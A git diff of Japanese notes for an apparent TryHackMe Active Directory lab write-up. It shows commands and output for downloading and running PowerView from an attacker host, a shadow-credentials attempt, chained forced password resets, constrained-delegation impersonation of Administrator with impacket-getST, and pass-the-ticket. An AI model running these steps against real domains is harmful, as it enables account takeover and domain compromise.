@@ -4,7 +4,7 @@
 
 ![](https://i.imgur.com/uTT7I2q.png)
 
-- URL : 
+- URL : https://tryhackme.com/room/resetui
 - #hard
 - OS : #Windows
 - Machine Author(s): tryhackme,h4sh3m00
@@ -998,6 +998,18 @@ Time.Started.....: Mon Jun  2 16:40:24 2025 (21 secs)
 
 ```
 
+
+PowerView .ps1の転送
+- AVにブロックされる
+	- 頑張って回避できるのかな
+```bash
+$url = 'http://10.9.2.89:8080/PowerView.ps1'
+$dest = 'C:\Users\TEMP\P.ps1'
+(New-Object System.Net.WebClient).DownloadFile($url, $dest)
+Test-Path $dest
+. .\p.ps1
+```
+
 #### 認証情報3
 TABATHA_BRITT : marlboro(1985)
 - RDPできる
@@ -1013,130 +1025,276 @@ RDPにログインできた
 ![](https://i.imgur.com/vER9Tg8.png)
 
 
+## BloodHoundでわかった流れ
+![](https://i.imgur.com/Ju6VFhb.png)
+### SHAWA_BRAYへの横展開
+まず、SHAWA_BRAYになる
+
+- TABATHA_BRITT@THM.CORP は、ユーザー SHAWNA_BRAY@THM.CORP に対して **GenericAll**権限を持ってる
+	- 対象のオブジェクトに対して自由に操作を行うことができる
+![](https://i.imgur.com/7n1omx4.png)
+
+Linux Abuseにはいくつか攻撃手法が示されていた
+- Targeted Kerberoast
+	- ハッシュがクラックできるかが問題
+- Force Change Password
+	- 強引
+- Shadow Credentials attack
+	- この攻撃を行う
+
+#### Shadow Credentialの試み
+pywhiskerというツールを使う
+- https://github.com/ShutdownRepo/pywhisker
+
+実行
+- 成功
+```bash
+└─$ pywhisker -d "haystack.thm.corp" -u "TABATHA_BRITT" -p "marlboro(1985)" --target "SHAWNA_BRAY" --action "add"
+[*] Searching for the target account
+[*] Target user found: CN=SHAWNA_BRAY,OU=Devices,OU=FIN,OU=Tier 1,DC=thm,DC=corp
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: 7ac615b7-8619-b515-e192-2438c9481739
+[*] Updating the msDS-KeyCredentialLink attribute of SHAWNA_BRAY
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -> PFX with cryptography: 84xsTPrM.pfx
+[+] PFX exportiert nach: 84xsTPrM.pfx
+[i] Passwort für PFX: mBwoLW7Z3GoGmokngZxt
+[+] Saved PFX (#PKCS12) certificate & key at path: 84xsTPrM.pfx
+[*] Must be used with password: mBwoLW7Z3GoGmokngZxt
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+
+```
+
+TGTを取得する
+- PKINITtoolsの中のgetTGTpkinit.pyを利用する
+	- https://github.com/dirkjanm/PKINITtools
+
+エラー起きた
+- Kerberos の PKINIT に必要な「証明書ベースの前認証データ」を KDC 側がサポートしていない、または有効化されていない
+- このホストで、 Shadow Credentialは使えない
+```bash
+gettgtpkinit thm.corp/SHAWNA_BRAY -cert-pfx /home/kali/Desktop/THM/machine/reset/shadow_credential/84xsTPrM.pfx  -pfx-pass mBwoLW7Z3GoGmokngZxt -dc-ip 10.10.245.192 SHAWNA_BRAY.ccache
+
+2025-06-03 08:07:57,178 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2025-06-03 08:07:57,193 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+Traceback (most recent call last):
+  File "/home/kali/tools/PKINITtools/gettgtpkinit.py", line 349, in <module>
+    main()
+    ~~~~^^
+  File "/home/kali/tools/PKINITtools/gettgtpkinit.py", line 345, in main
+    amain(args)
+    ~~~~~^^^^^^
+  File "/home/kali/tools/PKINITtools/gettgtpkinit.py", line 315, in amain
+    res = sock.sendrecv(req)
+  File "/home/kali/tools/PKINITtools/venv/lib/python3.13/site-packages/minikerberos/network/clientsocket.py", line 85, in sendrecv
+    raise KerberosError(krb_message)
+minikerberos.protocol.errors.KerberosError:  Error Name: KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)" 
+
+```
+
+
+#### Force Change Password
+![](https://i.imgur.com/Lcphexr.png)
+ここに書いてあるツールをそのまま使う
+
+- samba の net ツールを使って、ユーザーのパスワードを変更する
+何も出力されない
+```bash
+net rpc password "SHAWNA_BRAY" "newP@ssword2022" -U "thm.corp\\TABATHA_BRITT%marlboro(1985)" -S 10.10.245.192
+```
+
+新しい認証情報(newP@ssword2022)でログインできた
+```bash
+└─$ smbclient -L //10.10.245.192 -U "thm.corp/SHAWNA_BRAY"
+Password for [THM.CORP\SHAWNA_BRAY]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        Data            Disk      
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.245.192 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+```
+
+
+### CRUZ_HALLへの横展開
+![](https://i.imgur.com/1uhh8gv.png)
+
+攻撃手法は、ForceChangePasswordしかない
+- SHAWA_BRAYの手法と同様に進める
+#### ForceChangePassword
+```bash
+net rpc password "CRUZ_HALL" "newP@ssword2022" -U "thm.corp\SHAWNA_BRAY%newP@ssword2022" -S 10.10.245.192
+```
+
+同様に成功し、newP@ssword2022でログインできた
+```sh
+└─$ net rpc password "CRUZ_HALL" "newP@ssword2022" -U "thm.corp\SHAWNA_BRAY%newP@ssword2022" -S 10.10.245.192
+                                                                                                                                                                               
+┌──(kali㉿kali)-[~/…/THM/machine/reset/force_password]
+└─$ smbclient -L //10.10.245.192 -U "thm.corp/CRUZ_HALL"                                                         
+Password for [THM.CORP\CRUZ_HALL]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        Data            Disk      
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+
+```
+
+### DARLA_WINTERSへの横展開
+![](https://i.imgur.com/iyJ5R5U.png)
+Ownsというノードになっている
+- ユーザー CRUZ_HALL@THM.CORP は、ユーザー DARLA_WINTERS@THM.CORP のオーナー権限（所有権）を持っている
+- オブジェクトの所有者は、そのオブジェクトの アクセス制御リスト（DACL）上のパーミッションに関係なく、オブジェクトのセキュリティ記述子（アクセス権情報）を変更できる権限を持ち続ける
+	- CRUZ_HALL は DARLA_WINTERS に対して 任意の権限を後付けで追加できるということ
+
+Linux Abuseにはいくつか攻撃手法が示されていた
+- Targeted Kerberoast
+- Force Change Password
+- Shadow Credentials attack
+
+ここまできたら、最後もForce Change Password攻撃を行い、取得する
+#### Force Change Password
+上の二人の時と同様、攻撃は成功し、smbでログインできた
+```sh
+└─$ net rpc password "DARLA_WINTERS" "newP@ssword2022" -U "thm.corp\CRUZ_HALL%newP@ssword2022" -S 10.10.245.192
+                                                                                                                                                                               
+┌──(kali㉿kali)-[~/…/THM/machine/reset/force_password]
+└─$  smbclient -L //10.10.245.192 -U "DARLA_WINTERS/CRUZ_HALL"
+Password for [DARLA_WINTERS\CRUZ_HALL]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        Data            Disk      
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+
+```
+
+
+
+
 ---
 
 # Privilege Escalation
-## 流れ
-![](https://i.imgur.com/cgQNV9w.png)
+そして、最終的にDARLA_WINTERSまで横展開してきたが、どのように権限を昇格させられるのか
+## 制限付き委任の悪用
+- DARLA_WINTERSのNode Infoを見ていると、EXECUTION RIGHTSにConstrained Delegation Privilegesがあることがわかる
+![](https://i.imgur.com/YUZrR6m.png)
 
-これでいけるのでは？狙うはDomainAdmin権限なので
+![](https://i.imgur.com/OmTasyc.png)
+DARLA_WINTERSは、HAYSTACK.THM.CORPに対して、AllowedToDelegate権限があることがわかる
 
-1.	TABATHA_BRITT@THM.CORP
-	➜ CanRDP ➜ HAYSTACK.THMCORP（ホストへリモート接続可能）
-2.	HAYSTACK.THMCORP
-	➜ GenericAll ➜ TEST@THM.CORP（完全な権限を付与）
-3.	TEST@THM.CORP
-	➜ Contains ➜ HORACE_BOYLE@THM.CORP（グループに含まれる）
-4.	HORACE_BOYLE@THM.CORP
-	➜ MemberOf ➜ DOMAIN ADMINS@THM.CORP（Domain Admin グループのメンバー）
+AllowedToDelegate権限
+- 制限付き委任の目的は、特定サービスへの任意ユーザーとしての認証の許可するため
+	- 対象サービスは LDAP プロパティ msds-AllowedToDelegateTo に定義されたサービス
+- この権限により、対象ホスト上の特定サービスへのドメインユーザー（ドメイン管理者を含む）としてのなりすましの可能
+	- 制限事項として、「Protected Users」グループのメンバーなど、委任対象外に設定されたユーザーのなりすましの不可
+- チケット内のサービス名（sname）が保護対象外であることによる脆弱性の存在
+	- 攻撃者によるサービス名の改ざんの可能
+- 特定サービス名に関係なく、サーバー全体の権限奪取に繋がる危険性
 
-特に特別な権限は持ってない
+![](https://i.imgur.com/dJUaJI8.png)
+
 ```sh
-C:\Users\TEMP> whoami /priv
+次の例では、*victim* は攻撃者が制御するアカウント（つまり、ハッシュが既知）であり、**制限付き委任（constrained delegation）**が設定されています。
+つまり、*victim* の msds-AllowedToDelegateTo プロパティには、サービスプリンシパル名（SPN）として "HTTP/PRIMARY.testlab.local" が設定されています。
 
-PRIVILEGES INFORMATION
-----------------------
+このコマンドはまず、*victim* ユーザーの TGT（チケット取得チケット） を要求し、S4U2self/S4U2proxy プロセスを実行して、 "HTTP/PRIMARY.testlab.local" SPN に対して "admin" ユーザーをなりすまし（インパーソネート）します。
 
-Privilege Name                Description                    State
-============================= ============================== ========
-SeMachineAccountPrivilege     Add workstations to domain     Disabled
-SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
-SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+最後に、代替サービス名 "cifs" が最終的なサービスチケットに挿入されます。
+これにより攻撃者は、“admin” ユーザーとして PRIMARY.testlab.local のファイルシステムへアクセス可能になります。
+```
+割り当てられてる制限付き委任
+![](https://i.imgur.com/NCSjb2I.png)
+
+割り当てられてる制限付き委任
+```sh
+cifs/HayStack.thm.corp/thm.corp
+cifs/HayStack.thm.corp
+cifs/HAYSTACK
+cifs/HayStack.thm.corp/THM
+cifs/HAYSTACK/THM
 ```
 
-- なんかいくつか「THM」のオリジナルのグループある
-```bash
-PS C:\Users\TEMP> whoami /groups
+impacket-getSTツールでの攻撃が可能とのこと
+- https://www.kali.org/tools/impacket-scripts/#impacket-getst
 
-GROUP INFORMATION
------------------
+Administratorユーザーへ権限昇格する
+- 攻撃成功
+	- TGSの.ccacheが取得できたので、TGT攻撃が可能？
+```sh
+└─$ impacket-getST -spn 'cifs/HayStack.thm.corp' -dc-ip 10.10.245.192 -impersonate 'Administrator' 'THM.CORP/DARLA_WINTERS'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-Group Name                                 Type             SID                                          Attributes                            
-========================================== ================ ============================================ ==================================================
-Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
-BUILTIN\Windows Authorization Access Group Alias            S-1-5-32-560                                 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Terminal Server License Servers    Alias            S-1-5-32-561                                 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                 Group used for deny only              
-NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
-LOCAL                                      Well-known group S-1-2-0                                      Mandatory group, Enabled by default, Enabled group
-THM\AN-173-distlist1                       Group            S-1-5-21-1966530601-3185510712-10604624-1151 Mandatory group, Enabled by default, Enabled group
-THM\DnsUpdateProxy                         Group            S-1-5-21-1966530601-3185510712-10604624-1110 Mandatory group, Enabled by default, Enabled group
-THM\Gu-gerardway-distlist1                 Group            S-1-5-21-1966530601-3185510712-10604624-1152 Mandatory group, Enabled by default, Enabled group
-Authentication authority asserted identity Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
-THM\RAS and IAS Servers                    Alias            S-1-5-21-1966530601-3185510712-10604624-553  Group used for deny only, Local Group 
-Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                        
+Password:
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_HayStack.thm.corp@THM.CORP.ccache
+```
+
+## PtT
+AdministratorのTGSをセット
+```sh
+export KRB5CCNAME=Administrator@cifs_HayStack.thm.corp@THM.CORP.ccache
+```
+
+Administratorで接続
+smbclientでは使用できないので、impacket-smbclientで接続
+```sh
+impacket-smbclient -k -no-pass THM.CORP/Administrator@HayStack.thm.corp
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# ls
+[-] No share selected
+# shares
+ADMIN$
+C$
+Data
+IPC$
+NETLOGON
+SYSVOL
+
+# use C$
+# cd Users
+# cd Administrator
+# cd Desktop
+# ls
+drw-rw-rw-          0  Fri Jan 26 13:22:21 2024 .
+drw-rw-rw-          0  Fri Jan 26 13:22:21 2024 ..
+-rw-rw-rw-        282  Fri Jan 26 13:22:21 2024 desktop.ini
+-rw-rw-rw-        527  Fri Jan 26 13:22:21 2024 EC2 Feedback.website
+-rw-rw-rw-        554  Fri Jan 26 13:22:21 2024 EC2 Microsoft Windows Guide.website
+-rw-rw-rw-         30  Fri Jan 26 13:22:21 2024 root.txt
+# get root.txt
 ```
 
 
-PowerView .ps1の転送
-- AVにブロックされる
-	- 頑張って回避してもいいけど
-```bash
-$url = 'http://10.9.2.89:8080/PowerView.ps1'
-$dest = 'C:\Users\TEMP\P.ps1'
-(New-Object System.Net.WebClient).DownloadFile($url, $dest)
-Test-Path $dest
-. .\p.ps1
-
-```
-
-```bash
-dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'thm.corp'/'TABATHA_BRITT':'marlboro(1985)'
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
-
-
-- **Tactics**:
-    - #Tactic_特権昇格
-- **Techniques**:
-    - #T1068_特権昇格のためのエクスプロイト
-    - #T1055_プロセス注入
-    - #T1053_スケジュールされたタスク/ジョブ
-    - その他のPrivilege Escalation関連技術...
-
-
-
----
-
-## Notes
-
-- **Tactics**:
-    - #Tactic_永続化
-    - #Tactic_防御回避
-- **Techniques**:
-    - #T1098_アカウント操作
-    - #T1553_信頼制御の転覆
-    - #T1070_ホスト上の痕跡削除
-    - その他のPersistence/Defense Evasion関連技術...
-
-<このWriteupで特に重要な点や学んだことを追加で記載するセクション>
-
----
-## Flags
-
-- **User**: `<md5>`
-- **Root**: `<md5>`
 ---
 
 # 反省
